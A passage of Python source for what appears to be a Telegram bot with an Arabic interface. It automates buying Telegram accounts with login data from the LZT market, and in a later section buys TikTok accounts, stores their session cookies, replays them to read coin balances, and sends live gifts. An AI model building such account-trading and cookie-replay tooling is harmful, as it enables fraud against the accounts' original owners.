                            buy_tasks = [lzt_fast_buy_concurrent(session, item['item_id'], float(item['price'])) for item in targets_to_buy]
                            results = await asyncio.gather(*buy_tasks)

                            for success, item_data, price in results:
                                if success:
                                    ACTIVE_SNIPERS[task_id]["bought_count"] += 1
                                    asyncio.create_task(process_lzt_purchase(admin_id, item_data, price, task_name))

                            await asyncio.sleep(2)
                else:
                    await asyncio.sleep(6) 

            except asyncio.CancelledError:
                break
            except Exception:
                await asyncio.sleep(5)

    if task_id in ACTIVE_SNIPERS:
        final_count = ACTIVE_SNIPERS[task_id].get("bought_count", 0)
        del ACTIVE_SNIPERS[task_id]
        if final_count >= target_count:
            bot.send_message(admin_id, f"🏁┊ **اكـتـمـلـت مـهـمـة الـقـنـاص الـشـرس:** `{task_name}`\n•❐• تـم شـراء: {final_count} حـسـاب بـنـجـاح ⚡️")

def start_sniper_background(admin_id, task_name, filters, target_count=1, required_hours=0):
    task_id = f"task_{int(time.time())}_{admin_id}"
    def background_runner():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        ACTIVE_SNIPERS[task_id]["loop"] = loop
        task = loop.create_task(sniper_worker(task_id, admin_id, task_name, filters, target_count, required_hours))
        ACTIVE_SNIPERS[task_id]["task"] = task
        try:
            loop.run_until_complete(task)
        except asyncio.CancelledError:
            pass
        finally:
            loop.close()

    ACTIVE_SNIPERS[task_id] = {"name": task_name, "task": None, "loop": None, "filters": filters, "bought_count": 0}
    t = threading.Thread(target=background_runner, daemon=True)
    t.start()

# ==========================================
# 📱 دوال الشراء اليدوي واستكشاف الحسابات
# ==========================================
async def lzt_search_accounts_manual(filters):
    url = "https://api.lzt.market/telegram"
    currency_val = filters.get("currency", "usd")
    clean_filters = [("currency", currency_val)]
    for key, value in filters.items():
        if key == "currency": continue
        if isinstance(value, list):
            for v in value:
                clean_filters.append((key, v))
        else:
            if str(value).lower() not in ["nomatter", "الكل", "any", "", "none"]:
                clean_filters.append((key, value))
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=LZT_HEADERS, params=clean_filters, timeout=20) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("items", [])
    except:
        pass
    return []

async def lzt_fast_buy_manual(item_id, price):
    url = f"https://api.lzt.market/{item_id}/fast-buy"
    payload = {"price": price}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, headers=LZT_HEADERS, data=payload, timeout=25) as resp:
                data = await resp.json()
                if "errors" in data:
                    return False, data["errors"][0]
                if "item" in data and "loginData" in data["item"]:
                    return True, data["item"]
    except Exception as e:
        return False, str(e)
    return False, "Unknown Error"

# ==========================================
# 📱 واجهات الشراء التلقائي الرئيسية
# ==========================================
def lzt_main_keyboard():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🎯 صـيـد ID 8 الـسـريـع", callback_data="qs_start:lzt_id8"))
    markup.row(InlineKeyboardButton("🕰️ صـيـد ID 9 الأقـدم", callback_data="qs_start:lzt_id9"))
    markup.row(InlineKeyboardButton("🇮🇶 صـيـد الـعـراق (12₽ فوري) ⚡️", callback_data="qs_start:lzt_iraq"))
    markup.row(InlineKeyboardButton("🇮🇶 صـيـد الـعـراق (15₽ فوري) ⚡️", callback_data="qs_start:lzt_iraq_15"))
    markup.row(InlineKeyboardButton("🇮🇶 عراقي 12₽ (10 ثواني) ⏳", callback_data="qs_start:lzt_iraq_12_10"))
    markup.row(InlineKeyboardButton("🇮🇶 عراقي 15₽ (10 ثواني) ⏳", callback_data="qs_start:lzt_iraq_15_10"))
    markup.row(InlineKeyboardButton("🌍 تخصيص الدول (فوري) ⚡️", callback_data="qs_start:lzt_custom_country"))
    markup.row(InlineKeyboardButton("👑 الـتـخـصـيـص الـمـتـقـدم (The Boss)", callback_data="lzt_boss_menu"))

    if ACTIVE_SNIPERS:
        for tid, tinfo in list(ACTIVE_SNIPERS.items()):
            markup.row(InlineKeyboardButton(f"👀 مـراقـبـة: {tinfo['name']} 🟢", callback_data=f"task_manage:{tid}"))

    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـرئـيـسـيـة", callback_data="back_home"))
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "auto_buy_menu")
def lzt_menu_handler(call):
    if not is_allowed(call.from_user.id): return
    bot.answer_callback_query(call.id, "⏳ جـاري الاتـصـال بـسـيـرفـر LZT...")

    usd_bal, rub_bal = run_async(lzt_get_usd_balance())

    if usd_bal == -1.0:
        bot.edit_message_text("❌┊ **فـشـل الاتـصـال بـمـوقـع LZT!**\n•❐• تـأكـد مـن الـتـوكـن.", call.message.chat.id, call.message.message_id, reply_markup=InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home")))
        return

    text = (
        f"🛒┊ **قـسـم الـشـراء الـتـلـقـائـي والـقـنـص:**\n\n"
        f"⎉╎ رصـيـدك بـالـروبـل: `{rub_bal} RUB`\n"
        f"⎉╎ رصـيـدك بـالـدولار: `{usd_bal}$`\n\n"
        f"•❐• اخـتـر إحـدى اسـتـراتـيـجـيـات الـصـيـد مـن الأسـفـل ⬇️"
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=lzt_main_keyboard(), parse_mode="Markdown")

# ==========================================
# 🚀 خطوات الاستجواب الخاصة بالصيد السريع
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("qs_start:"))
def quick_sniper_step_1(call):
    if not is_allowed(call.from_user.id): return
    uid = call.from_user.id
    if uid not in USER_STATES: USER_STATES[uid] = {}
    USER_STATES[uid]["quick_snipe_type"] = call.data.split(":")[1]

    text = (
        "🎯┊ **كـم عـدد الـحـسـابـات الـتـي تـريـد صـيـدهـا دفـعـة واحـدة؟**\n\n"
        "•❐• (أرْسـل رقـم فـقـط)."
    )
    msg = bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(msg, quick_sniper_step_2)

def quick_sniper_step_2(message):
    uid = message.from_user.id
    try:
        count = int(message.text.strip())
        USER_STATES[uid]["quick_snipe_count"] = count
    except ValueError:
        bot.send_message(message.chat.id, "❌┊ خـطـأ! يـجـب إرسـال رقـم صـحـيـح.")
        return

    snipe_type = USER_STATES[uid].get("quick_snipe_type", "")

    if snipe_type in ["lzt_iraq", "lzt_iraq_15", "lzt_iraq_12_10", "lzt_iraq_15_10"]:
        execute_quick_snipe(uid, 0, 0, message)
        return

    if snipe_type == "lzt_custom_country":
        text = (
            "🌍┊ **أرْسـل اخـتـصـار الـدولـة أو الـدول**\n\n"
            "⎉╎ مـثـال لـدولـة واحـدة: `QA`\n"
            "⎉╎ مـثـال لـعـدة دول: `BH CA QA`"
        )
        msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
        bot.register_next_step_handler(msg, quick_sniper_step_custom_country)
        return

    if snipe_type == "lzt_id8":
        default_pmax = 3.0
        btn_text = "🌟 اسـتـخـدام الافـتـراضـي (0.1$ إلـى 3.0$)"
    else:
        default_pmax = 0.6
        btn_text = "🌟 اسـتـخـدام الافـتـراضـي (0.1$ إلـى 0.6$)"

    USER_STATES[uid]["default_pmax"] = default_pmax

    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton(btn_text, callback_data="qs_price_default"))

    text = (
        "💰┊ **أرْسـل نـطـاق الـسـعـر بـالـدولار**\n\n"
        "⎉╎ أرْسـلـه هـكـذا: `الـحـد_الأدنـى الـحـد_الأقـصـى`\n"
        "⎉╎ مـثـال: `0.2 0.6`\n"
        "•❐• أو اخـتـر الافـتـراضـي مـن الـزر بـالأسـفـل ⬇️"
    )
    msg = bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
    bot.register_next_step_handler(msg, quick_sniper_step_3_text)

def quick_sniper_step_custom_country(message):
    uid = message.from_user.id
    countries = message.text.strip().upper().split()
    if not countries: return bot.send_message(message.chat.id, "❌┊ يـرجـى إرسـال رمـز دولـة صـحـيـح.")
    USER_STATES[uid]["custom_countries"] = countries

    text = (
        "💰┊ **أرْسـل الـسـعـر بـالـروبـل الـروسـي (RUB)**\n\n"
        "⎉╎ إرسـال رقـم واحـد (يـكـون الـحـد الأقـصـى) مـثـال: `15`\n"
        "⎉╎ إرسـال رقـمـيـن (أدنـى وأقـصـى) مـثـال: `12 17`"
    )
    msg = bot.send_message(message.chat.id, text, parse_mode="Markdown")
    bot.register_next_step_handler(msg, quick_sniper_step_custom_price)

def quick_sniper_step_custom_price(message):
    uid = message.from_user.id
    text_clean = message.text.replace(",", ".").replace("،", ".")
    numbers = re.findall(r"\d+\.\d+|\d+", text_clean)

    if not numbers:
        bot.send_message(message.chat.id, "❌┊ لـم أتـمـكـن مـن قـراءة الـسـعـر.", parse_mode="Markdown")
        return

    try:
        if len(numbers) == 1:
            pmin = 0.0
            pmax = float(numbers[0])
        else:
            v1, v2 = float(numbers[0]), float(numbers[1])
            pmin, pmax = min(v1, v2), max(v1, v2)
    except:
        return bot.send_message(message.chat.id, "❌┊ حـدث خـطـأ فـي تـحـويـل الأرقـام.")

    try:
        execute_quick_snipe(uid, pmin, pmax, message)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌┊ حـدث خـطـأ:\n`{e}`", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "qs_price_default")
def quick_sniper_step_3_btn(call):
    uid = call.from_user.id
    bot.clear_step_handler_by_chat_id(call.message.chat.id)
    default_pmax = USER_STATES.get(uid, {}).get("default_pmax", 0.6)
    execute_quick_snipe(uid, 0.1, default_pmax, call.message)

def quick_sniper_step_3_text(message):
    uid = message.from_user.id
    text_clean = message.text.replace(",", ".").replace("،", ".")
    numbers = re.findall(r"\d+\.\d+|\d+", text_clean)

    if len(numbers) < 2:
        bot.send_message(message.chat.id, "❌┊ لـم أتـمـكـن مـن قـراءة الـسـعـريـن.", parse_mode="Markdown")
        return
    try:
        v1, v2 = float(numbers[0]), float(numbers[1])
        pmin, pmax = min(v1, v2), max(v1, v2)
    except:
        return bot.send_message(message.chat.id, "❌┊ حـدث خـطـأ فـي تـحـويـل الأرقـام.")

    try:
        execute_quick_snipe(uid, pmin, pmax, message)
    except Exception as e:
        bot.send_message(message.chat.id, f"❌┊ حـدث خـطـأ:\n`{e}`", parse_mode="Markdown")

def execute_quick_snipe(uid, pmin, pmax, message_obj):
    state = USER_STATES.get(uid, {})
    snipe_type = state.get("quick_snipe_type")
    count = state.get("quick_snipe_count", 1)

    if not snipe_type:
        return bot.send_message(message_obj.chat.id, "❌┊ فُـقـدت بـيـانـات الـجـلـسـة.")

    base_filters = {"pmin": pmin, "pmax": pmax, "spam": "no", "password": "no", "order_by": "price_to_up"}

    if snipe_type == "lzt_id8":
        task_name = f"🎯 صيد ID 8 ({pmin}$-{pmax}$)"
        filters = {**base_filters, "dig_min": 8, "dig_max": 8, "order_by": "pdate_to_up"}
    elif snipe_type == "lzt_id9":
        task_name = f"🕰️ صيد ID 9 ({pmin}$-{pmax}$)"
        filters = {**base_filters, "dig_min": 9, "dig_max": 9, "order_by": "pdate_to_up"}
    elif snipe_type == "lzt_iraq":
        task_name = f"🇮🇶 صيد العراق 12₽ (فوري)"
        filters = {"pmax": 12, "currency": "rub", "spam": "no", "password": "no", "order_by": "price_to_up", "country[]": ["IQ"]}
    elif snipe_type == "lzt_iraq_15":
        task_name = f"🇮🇶 صيد العراق 15₽ (فوري)"
        filters = {"pmax": 15, "currency": "rub", "spam": "no", "password": "no", "order_by": "price_to_up", "country[]": ["IQ"]}
    elif snipe_type == "lzt_iraq_12_10":
        task_name = f"🇮🇶 عراقي 12₽ (10 ثواني)"
        filters = {"pmax": 12, "currency": "rub", "spam": "no", "password": "no", "order_by": "price_to_up", "country[]": ["IQ"]}
    elif snipe_type == "lzt_iraq_15_10":
        task_name = f"🇮🇶 عراقي 15₽ (10 ثواني)"
        filters = {"pmax": 15, "currency": "rub", "spam": "no", "password": "no", "order_by": "price_to_up", "country[]": ["IQ"]}
    elif snipe_type == "lzt_custom_country":
        countries = state.get("custom_countries", [])
        c_label = " ".join(countries)
        task_name = f"🌍 صيد {c_label} ({pmax}₽ فوري)"
        filters = {
            "pmin": pmin,
            "pmax": pmax, 
            "currency": "rub", 
            "spam": "no", 
            "password": "no", 
            "order_by": "price_to_up"
        }
        if countries:
            filters["country[]"] = countries
    else:
        return bot.send_message(message_obj.chat.id, "❌┊ نـوع الـصـيـد غـيـر مـعـروف.")

    start_sniper_background(uid, task_name, filters, target_count=count, required_hours=0)

    msg_success = (
        f"✅┊ **تـم إطـلاق الـقـنـاص الـشـرس بـنـجـاح!**\n\n"
        f"⎉╎ الـمـهـمـة: `{task_name}`\n"
        f"⎉╎ الـعـدد الـمـطـلـوب: `{count}` حـسـابـات\n\n"
        f"•❐• اضـغـط /start لـمـتـابـعـة مـهـامـك فـي قـائـمـة الـمـراقـبـة."
    )
    bot.send_message(message_obj.chat.id, msg_success, parse_mode="Markdown")

# ==========================================
# 👁️ إدارة مهام المراقبة النشطة وعرض حساباتها
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("task_manage:"))
def task_manage_menu(call):
    if not is_allowed(call.from_user.id): return
    tid = call.data.split(":")[1]

    if tid not in ACTIVE_SNIPERS:
        bot.answer_callback_query(call.id, "❌┊ الـمـهـمـة غـيـر مـوجـودة أو اكـتـمـلـت.", show_alert=True)
        return lzt_menu_handler(call)

    tinfo = ACTIVE_SNIPERS[tid]

    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🔍 عـرض مـا يـراه الـقـنـاص (Live)", callback_data=f"task_view:{tid}"))
    markup.row(InlineKeyboardButton("🛑 إيـقـاف وحـذف الـمـراقـبـة", callback_data=f"task_stop:{tid}"))
    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـقـسـم", callback_data="auto_buy_menu"))

    text = (
        f"⚙️┊ **إدارة الـمـراقـبـة الـنـشـطـة:**\n\n"
        f"⎉╎ الـمـهـمـة: `{tinfo['name']}`\n"
        f"•❐• مـاذا تـريـد أن تـفـعـل؟ ⬇️"
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("task_view:"))
def task_view_logic(call):
    if not is_allowed(call.from_user.id): return
    tid = call.data.split(":")[1]

    if tid not in ACTIVE_SNIPERS:
        return bot.answer_callback_query(call.id, "❌┊ الـمـهـمـة غـيـر مـوجـودة.", show_alert=True)

    bot.answer_callback_query(call.id, "🔍 جـاري جـلـب الـحـسـابـات مـن الـمـاركـت...")

    tinfo = ACTIVE_SNIPERS[tid]
    filters = tinfo["filters"]

    items = run_async(lzt_search_accounts_manual(filters))

    if not items:
        return bot.send_message(call.message.chat.id, f"❌┊ لا تـوجـد حـسـابـات مـتـوفـرة حـالـيـاً تـطـابـق فـلاتـر مـهـمـة ({tinfo['name']}).")

    bot.send_message(call.message.chat.id, f"📊┊ **أفـضـل الـحـسـابـات الـتـي يـراهـا الـقـنـاص حـالـيـاً:**")

    for item in items[:5]: 
        i_id = item['item_id']
        price = float(item['price'])
        country = item.get('account_country', 'غير معروف').upper()
        digits = item.get('telegram_id_digits', 'غير معروف')
        spam_status = "نعم ❌" if item.get('spam') else "لا ✅"
        currency_symbol = "RUB" if filters.get("currency") == "rub" else "$"

        text = (
            f"👤┊ **مـطـابـق لـلـمـراقـبـة**\n\n"
            f"⎉╎ الـسـعـر: `{price} {currency_symbol}`\n"
            f"⎉╎ الـدولـة: `{country}` | 🔢 الآيـدي: `{digits}` أرقـام\n"
            f"⎉╎ مـقـيـد (سـبـام): {spam_status}\n"
            f"•❐• كـود الـمـنـتـج: `{i_id}`"
        )
        markup = InlineKeyboardMarkup().row(InlineKeyboardButton(f"🛒 شـراء الآن", callback_data=f"manual_buy:{i_id}:{price}"))
        bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("task_stop:"))
def task_stop_logic(call):
    if not is_allowed(call.from_user.id): return
    tid = call.data.split(":")[1]

    if tid in ACTIVE_SNIPERS:
        tinfo = ACTIVE_SNIPERS[tid]
        loop = tinfo.get("loop")
        task = tinfo.get("task")

        if loop and task and not task.done():
            loop.call_soon_threadsafe(task.cancel)

        del ACTIVE_SNIPERS[tid]
        bot.answer_callback_query(call.id, "🛑 تـم إلـغـاء وإيـقـاف الـمـهـمـة بـنـجـاح!", show_alert=True)

    lzt_menu_handler(call)

# ==========================================
# 👑 لوحة التخصيص المتقدم (The Boss)
# ==========================================
def boss_menu_markup(uid):
    state = USER_STATES.get(uid, {}).get("boss_filters", {
        "pmin": "0.1", "pmax": "0.4", "country": "الكل", "dig_min": "8", "dig_max": "9",
        "hours": "12", "order": "pdate_to_up", "2fa": "no", "spam": "no", "target_count": "1"
    })

    order_label = "الأقـدم أولاً 🕰️" if state['order'] == "pdate_to_up" else "الأرخـص أولاً ⬇️"

    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton(f"الـحـد الأدنـى: {state['pmin']}$", callback_data="boss_edit:pmin"),
        InlineKeyboardButton(f"الـحـد الأقـصـى: {state['pmax']}$", callback_data="boss_edit:pmax")
    )
    markup.row(
        InlineKeyboardButton(f"الـدولـة: {state['country']}", callback_data="boss_edit:country"),
        InlineKeyboardButton(f"الآيـدي: {state['dig_min']}-{state['dig_max']}", callback_data="boss_edit:digits")
    )
    markup.row(
        InlineKeyboardButton(f"🕰️ وقـت الـنـشـر: +{state['hours']} سـاعـة", callback_data="boss_edit:hours"),
        InlineKeyboardButton(f"🎯 عـدد الـحـسـابـات: {state.get('target_count', '1')}", callback_data="boss_edit:target_count")
    )
    markup.row(InlineKeyboardButton(f"الـتـرتـيـب: {order_label}", callback_data="boss_toggle:order"))
    markup.row(
        InlineKeyboardButton(f"2FA: {'مـمـنـوع ❌' if state['2fa']=='no' else 'لا يـهـم 🤷‍♂️'}", callback_data="boss_toggle:2fa"),
        InlineKeyboardButton(f"سـبـام: {'مـمـنـوع ❌' if state['spam']=='no' else 'لا يـهـم 🤷‍♂️'}", callback_data="boss_toggle:spam")
    )
    markup.row(InlineKeyboardButton("👁️ اسـتـكـشـاف الـحـسـابـات الـمـتـوفـرة (شراء يدوي)", callback_data="boss_live_explore"))
    markup.row(InlineKeyboardButton("🚀 بـدء الـمـراقـبـة والـقـنـص الـتـلـقـائـي", callback_data="boss_start_sniper"))
    markup.row(InlineKeyboardButton("🔙 رجـوع لـلـقـسـم", callback_data="auto_buy_menu"))
    return markup

@bot.callback_query_handler(func=lambda call: call.data == "lzt_boss_menu")
def lzt_boss_menu(call):
    if not is_allowed(call.from_user.id): return
    uid = call.from_user.id

    if uid not in USER_STATES: USER_STATES[uid] = {}

    if "boss_filters" not in USER_STATES[uid]:
        USER_STATES[uid]["boss_filters"] = {
            "pmin": "0.1", "pmax": "0.4", "country": "الكل", "dig_min": "8", "dig_max": "9",
            "hours": "12", "order": "pdate_to_up", "2fa": "no", "spam": "no", "target_count": "1"
        }

    text = (
        f"👑┊ **لـوحـة الـقـنـص الـمـتـقـدمـة (The Boss):**\n\n"
        f"⎉╎ قـم بـتـخـصـيـص الـفـلاتـر بـدقـة قـبـل الـبـدء.\n"
        f"•❐• يـمـكـنـك اسـتـكـشـاف الـحـسـابـات قـبـل الـشـراء ⬇️"
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=boss_menu_markup(uid), parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("boss_toggle:"))
def boss_toggle(call):
    uid = call.from_user.id
    target = call.data.split(":")[1]
    state = USER_STATES[uid]["boss_filters"]

    if target == "order": state["order"] = "price_to_up" if state["order"] == "pdate_to_up" else "pdate_to_up"
    elif target == "2fa": state["2fa"] = "nomatter" if state["2fa"] == "no" else "no"
    elif target == "spam": state["spam"] = "nomatter" if state["spam"] == "no" else "no"

    bot.edit_message_reply_markup(call.message.chat.id, call.message.message_id, reply_markup=boss_menu_markup(uid))

@bot.callback_query_handler(func=lambda call: call.data.startswith("boss_edit:"))
def boss_edit_start(call):
    uid = call.from_user.id
    field = call.data.split(":")[1]
    USER_STATES[uid]["action"] = "boss_editing"
    USER_STATES[uid]["edit_field"] = field

    prompts = {
        "pmin": "أرْسـل الـحـد الأدنـى لـلـسـعـر (مـثـال: 0.1):",
        "pmax": "أرْسـل الـحـد الأقـصـى لـلـسـعـر (مـثـال: 3.5):",
        "country": "أرْسـل رمـز الـدولـة (مـثـال IQ أو RU) أو اكـتـب 'الكل':",
        "digits": "أرْسـل طـول الآيـدي بـصـيـغـة (مـن-إلـى) مـثـال: 8-9 :",
        "hours": "أرْسـل عـدد الـسـاعـات الـمـطـلـوبـة (مـثـال: 15):",
        "target_count": "أرْسـل عـدد الـحـسـابـات الـمـراد شـراؤهـا (مـثـال: 5):"
    }
    msg = bot.send_message(call.message.chat.id, f"•❐• {prompts.get(field, 'أرْسـل الـقـيـمـة الـجـديـدة:')}")
    bot.register_next_step_handler(msg, process_boss_edit)

def process_boss_edit(message):
    uid = message.from_user.id
    if uid not in USER_STATES or USER_STATES[uid].get("action") != "boss_editing": return
    field = USER_STATES[uid]["edit_field"]
    val = message.text.strip()
    state = USER_STATES[uid]["boss_filters"]

    try:
        if field in ["pmin", "pmax"]: state[field] = str(float(val))
        elif field in ["hours", "target_count"]: state[field] = str(int(val))
        elif field == "country": state[field] = val.upper()
        elif field == "digits":
            dmin, dmax = val.split('-')
            state["dig_min"] = str(int(dmin))
            state["dig_max"] = str(int(dmax))

        if field in ["pmin", "pmax"]:
            v1 = float(state["pmin"])
            v2 = float(state["pmax"])
            state["pmin"] = str(min(v1, v2))
            state["pmax"] = str(max(v1, v2))
    except:
        return bot.send_message(message.chat.id, "❌┊ إدخـال غـيـر صـالـح.")

    bot.send_message(message.chat.id, "✅┊ تـم الـحـفـظ بـنـجـاح.", reply_markup=InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 للـوحـة الـتـخـصـيـص", callback_data="lzt_boss_menu")))

@bot.callback_query_handler(func=lambda call: call.data == "boss_live_explore")
def boss_live_explore(call):
    uid = call.from_user.id
    bot.answer_callback_query(call.id, "🔍 يـتـم جـلـب الـحـسـابـات...")
    state = USER_STATES[uid]["boss_filters"]

    filters = {
        "dig_min": int(state["dig_min"]), "dig_max": int(state["dig_max"]),
        "spam": state["spam"], "password": state["2fa"], "order_by": state["order"],
        "pmin": float(state["pmin"]), "pmax": float(state["pmax"])
    }
    if state["country"] != "الكل": filters["country[]"] = [state["country"]]

    items = run_async(lzt_search_accounts_manual(filters))

    if not items:
        return bot.send_message(call.message.chat.id, "❌┊ لا تـوجـد حـسـابـات مـتـوفـرة تـطـابـق فـلاتـرك.")

    req_hours = int(state["hours"])
    valid_items = []

    for item in items:
        pub_date = item.get('published_date') or item.get('date', time.time())
        age_hours = (time.time() - pub_date) / 3600
        if age_hours >= req_hours:
            valid_items.append((item, age_hours))
        if len(valid_items) == 5: break

    if not valid_items:
        return bot.send_message(call.message.chat.id, f"❌┊ وجـدنـا حـسـابـات ولـكـن لـم يـمـر عـلـيـهـا {req_hours} سـاعـة حـتـى الآن.")

    bot.send_message(call.message.chat.id, "📊┊ **أفـضـل الـحـسـابـات الـمـتـوفـرة الآن (The Boss):**")

    for item, age in valid_items:
        i_id = item['item_id']
        price = float(item['price'])
        country = item.get('account_country', 'غير معروف').upper()
        digits = item.get('telegram_id_digits', 'غير معروف')
        spam_status = "نعم ❌" if item.get('spam') else "لا ✅"

        text = (
            f"👤┊ **حـسـاب تـيـلـيـجـرام مـمـيـز**\n\n"
            f"⎉╎ الـسـعـر: `{price}$`\n"
            f"⎉╎ الـدولـة: `{country}` | 🔢 الآيـدي: `{digits}` أرقـام\n"
            f"⎉╎ وقـت الـنـشـر: قـبـل `{int(age)} سـاعـة`\n"
            f"⎉╎ مـقـيـد (سـبـام): {spam_status}\n"
            f"•❐• كـود الـمـنـتـج: `{i_id}`"
        )
        markup = InlineKeyboardMarkup().row(InlineKeyboardButton(f"🛒 شـراء الآن", callback_data=f"manual_buy:{i_id}:{price}"))
        bot.send_message(call.message.chat.id, text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "boss_start_sniper")
def boss_start(call):
    uid = call.from_user.id
    state = USER_STATES[uid]["boss_filters"]

    filters = {
        "dig_min": int(state["dig_min"]), "dig_max": int(state["dig_max"]),
        "spam": state["spam"], "password": state["2fa"], "order_by": state["order"],
        "pmin": float(state["pmin"]), "pmax": float(state["pmax"])
    }
    if state["country"] != "الكل": filters["country[]"] = [state["country"]]

    target_count = int(state.get("target_count", 1))

    start_sniper_background(uid, "👑 قناص The Boss", filters, target_count=target_count, required_hours=int(state["hours"]))
    bot.answer_callback_query(call.id, f"🚀 تـم إطـلاق الـقـنـاص! الـهـدف: {target_count} حـسـاب.", show_alert=True)
    lzt_menu_handler(call)

# ==========================================
# 🛒 تنفيذ الشراء اليدوي المباشر
# ==========================================
@bot.callback_query_handler(func=lambda call: call.data.startswith("manual_buy:"))
def manual_buy_action(call):
    uid = call.from_user.id
    _, item_id, price = call.data.split(":")
    bot.edit_message_text(f"⏳ جـاري تـنـفـيـذ الـشـراء لـ {item_id}...", call.message.chat.id, call.message.message_id)

    async def do_buy():
        success, result = await lzt_fast_buy_manual(item_id, float(price))
        if success:
            bot.edit_message_text("✅┊ تـمـت الـعـمـلـيـة فـي LZT، جـاري تـسـجـيـل الـجـلـسـة...", call.message.chat.id, call.message.message_id)
            await process_lzt_purchase(uid, result, float(price), "شـراء يـدوي مـبـاشـر")
        else:
            bot.edit_message_text(f"❌┊ فـشـل الـشـراء:\n`{result}`", call.message.chat.id, call.message.message_id)

    run_async(do_buy())















#داله التيك توك تبدا من هنا:::







import json
import threading
import time
import requests
import sqlite3
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import logging

# ==========================================
# ✦ إعدادات تيك توك المستقلة والمتغيرات ✦
# ==========================================
# (يتم استخدام LZT_HEADERS الخاصة بك المعرفة مسبقاً في ملفك للبحث عن الحسابات)

tt_user_states = {} 
ACTIVE_TT_SNIPERS = {} 
ACTIVE_TT_GIFTERS = {} 

# معرفات هدايا تيك توك (أمثلة قابلة للتعديل)
GIFT_100_COINS = 5655 # هدية بـ 100 عملة
GIFT_20_COINS = 5269  # هدية بـ 20 عملة

# إنشاء قاعدة بيانات تيك توك المستقلة
tt_conn = sqlite3.connect('tiktok_database.db', check_same_thread=False)
tt_cursor = tt_conn.cursor()
tt_cursor.execute('''
    CREATE TABLE IF NOT EXISTS tt_accounts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        item_id TEXT UNIQUE,
        price REAL,
        coins INTEGER,
        followers INTEGER,
        json_data TEXT,
        cookies TEXT
    )
''')
tt_conn.commit()

# ==========================================
# ✦ دوال التعامل مع تيك توك LZT API ✦
# ==========================================
def lzt_search_tiktok(pmin=None, pmax=None, coins_min=None, coins_max=None):
    url = "https://api.lzt.market/tiktok"
    params = {"cookie_login": "yes"} 

    if pmin is not None: params["pmin"] = pmin
    if pmax is not None: params["pmax"] = pmax
    if coins_min is not None: params["coins_min"] = coins_min
    if coins_max is not None: params["coins_max"] = coins_max

    try:
        req = requests.get(url, headers=LZT_HEADERS, params=params)
        data = req.json()
        if "items" in data:
            return data["items"]
        return []
    except Exception as e:
        logging.error(f"LZT Search Error: {e}")
        return []

def lzt_fast_buy(item_id, price):
    url = f"https://api.lzt.market/{item_id}/fast-buy"
    data = {"price": price}

    for _ in range(100): 
        try:
            req = requests.post(url, headers=LZT_HEADERS, data=data)
            resp = req.json()
            if "errors" in resp and "retry_request" in str(resp["errors"]):
                time.sleep(1)
                continue
            if "item" in resp or "success" in resp:
                return True
        except:
            pass
        break
    return False

def lzt_get_account_data(item_id):
    url = f"https://api.lzt.market/{item_id}"
    try:
        req = requests.get(url, headers=LZT_HEADERS)
        return req.json().get("item", {})
    except:
        return {}

# ==========================================
# ✦ دوال التعامل مع تيك توك API (الحقيقية) ✦
# ==========================================
def parse_cookies_to_dict(json_str):
    try:
        data = json.loads(json_str)
        cookies_dict = {}
        for c in data:
            cookies_dict[c['name']] = c['value']
        return cookies_dict
    except:
        return None

def tt_get_account_info(cookies_dict):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*"
    }
    try:
        profile_url = "https://www.tiktok.com/api/user/detail/"
        req = requests.get(profile_url, headers=headers, cookies=cookies_dict, timeout=10)
        data = req.json()
        followers = data.get("userInfo", {}).get("stats", {}).get("followerCount", 0)

        wallet_url = "https://www.tiktok.com/api/wallet/v1/balance/"
        w_req = requests.get(wallet_url, headers=headers, cookies=cookies_dict, timeout=10)
        w_data = w_req.json()
        coins = w_data.get("data", {}).get("coins", 0) 

        return {"success": True, "followers": followers, "coins": coins}
    except Exception as e:
        return {"success": False, "error": str(e)}

def tt_get_live_room_id(username):
    headers = {"User-Agent": "Mozilla/5.0"}
    url = f"https://www.tiktok.com/api/live/detail/?target_username={username}"
    try:
        req = requests.get(url, headers=headers, timeout=10)
        data = req.json()
        room_id = data.get("LiveRoomInfo", {}).get("room_id")
        return room_id
    except:
        return None

def tt_send_gift(room_id, gift_id, cookies_dict):
    url = "https://webcast.tiktok.com/webcast/gift/send/"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    payload = {
        "room_id": room_id,
        "gift_id": gift_id,
        "gift_count": 1
    }
    try:
        req = requests.post(url, headers=headers, cookies=cookies_dict, data=payload, timeout=10)
        data = req.json()
        if data.get("status_code") == 0:
